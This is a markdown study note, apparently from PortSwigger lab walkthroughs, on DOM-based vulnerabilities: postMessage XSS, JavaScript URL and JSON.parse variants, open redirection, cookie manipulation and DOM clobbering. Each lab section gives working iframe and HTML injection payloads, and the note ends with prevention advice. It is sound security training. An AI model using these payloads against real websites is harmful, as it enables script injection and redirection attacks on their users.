# DOM-based vulnerabilities

**what is DOM** 
- The DOM is a browser representation of page elements, and JavaScript can securely or insecurely manipulate it.


***What id DOM-XSS*** 
- DOM-based XSS (Cross-Site Scripting) happens when JavaScript in a web page takes untrusted (attacker-controlled) data from a source (like location.hash or document.cookie) and passes it directly into a sink (like innerHTML or eval()) without sanitizing it.

## Lab: DOM XSS using web messages


The code:

```
window.addEventListener('message', function(e) {
                            document.getElementById('ads').innerHTML = e.data;
                            })

```

### What’s happening:

- The page listens for messages sent to it via postMessage or other frames/windows.

- Whatever e.data contains is directly inserted into the DOM via innerHTML without sanitization.

- If an attacker can send a crafted message to the page, they can inject arbitrary HTML/JS.

### Why it’s vulnerable
```
- innerHTML interprets input as HTML, so <script> or event handlers (like onerror) will execute.

- The developer has not validated origin (i.e., e.origin) or sanitized e.data.
```

### Attack Steps
- Identify the vulnerable listener:

  - Look for window.addEventListener('message', ...) in JS.

  - Check if the callback uses innerHTML or document.write with untrusted data.

- Verify there’s no origin check:
   ```
   if (e.origin !== "https://trusted-site.com") return;
   If missing → vulnerable.
   ```
- Craft a malicious message to exploit:
	```
	window.postMessage('<img src=x onerror=alert(1)>', '*');
    '*' sends to any origin.
    The payload uses an event handler (onerror) to trigger JavaScript.
  
    ```


### Real-World Exploit
- If you can open the target page in an iframe or another tab, you can inject:

```

<iframe src="https://victim.com"></iframe>
<script>
    // Wait until iframe loads, then send payload
    window.frames[0].postMessage('<img src=x onerror=alert(document.domain)>', '*');
</script>
```

```
<iframe src="https://vitim.com/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">
```


### Fix
- Validate origin:
```
if (e.origin !== "https://trusted-site.com") return;
```
- Sanitize data (e.g., DOMPurify) before inserting into the DOM:
```
document.getElementById('ads').innerHTML = DOMPurify.sanitize(e.data);
```

- Avoid using innerHTML unless necessary — use textContent for plain text.

<hr>

## Lab: DOM XSS using web messages and a JavaScript URL


Analysis :
 - Find : addEventListener
 - window.postMessage("javascript:alert(1);//https://abc.com","*")
```
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//https:bing.com','*')">
```


## Lab: DOM XSS using web messages and JSON.parse

Analysis : The SCRIPT
  - Find : addEventListener
```
//Testing Payload 
window.postMessage(
    JSON.stringify({
        type: "load-channel",
        url: "javascript:alert(document.domain)"
    }),
    "*"
);
```

```
<iframe src=https://0acd00030425513d807c034e00090016.web-security-academy.net/ onload='this.contentWindow.postMessage(`{"type":"load-channel","url":"javascript:print()"}`,"*")'>


<iframe src=https://vul.net/ onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>
```

## Lab: DOM-based open redirection

Analysis :
```
<a href='#' onclick='returnURL' = /url=https?:\/\/.+)/.exec(location); if(returnUrl)location.href = returnUrl[1];else location.href = "/"'>Back to Blog</a>
```

  - The url parameter contains an open redirection vulnerability that allows you to change where the "Back to Blog"

payload : 

```
https://YOUR-LAB-ID.web-security-academy.net/post?postId=4&url=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/
```

<hr>

## Lab: DOM-based cookie manipulation

Analysis :  &'><script>alert(1)</script>
payload : 

```
<iframe src="https://target.web.net/product?productId=1&'><script>print()</script>" onload="if(!window.x)this.src='https://target.web.net';window.x=1;">
```
<hr>

## Lab: Exploiting DOM clobbering to enable XSS

```
<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">
```


## Lab: Clobbering DOM attributes to bypass HTML filters


Ananlysis :  

```
Paste this in comment postId=3:  

<form id=x tabindex=0 onfocus=print()><input id=attributes>

Payload : 

       <iframe src=https://YOUR-LAB-ID.web-security-academy.net/post?postId=3 onload="setTimeout(()=>this.src=this.src+'#x',500)">

```


## How to prevent DOM-Based Vulnerabilities:

- Avoid using untrusted data directly in dangerous DOM sinks (e.g., innerHTML, eval, document.write, event handler attributes, location, etc.).

- Validate input with a whitelist – only allow known safe values or patterns.

- Sanitize or encode output based on the context:

    - HTML encoding for HTML contexts.

    - JavaScript encoding for script contexts.

    - CSS encoding for style contexts.

    - URL encoding for links or parameters.

- Use well-tested security libraries (e.g., DOMPurify, OWASP Java Encoder) instead of writing your own sanitizer/encoder.

- Protocol restrictions – block dangerous URI schemes (javascript:, data:, cid:) in URLs from untrusted sources.

- Implement defense-in-depth – combine validation, sanitization, Content Security Policy (CSP), and strict type checks.

- Never trust DOM-created globals – avoid patterns like window.varName || fallback without validation to prevent DOM clobbering.


<hr>

## That packs in:

- Validate → Whitelist input

- Sanitize → Clean dangerous parts

- Encode → Context-specific output encoding

- Never Trust → Any untrusted DOM/URL data

- Always Restrict → Protocols, globals, sinks

- Layer Defenses → CSP, type checks, libraries

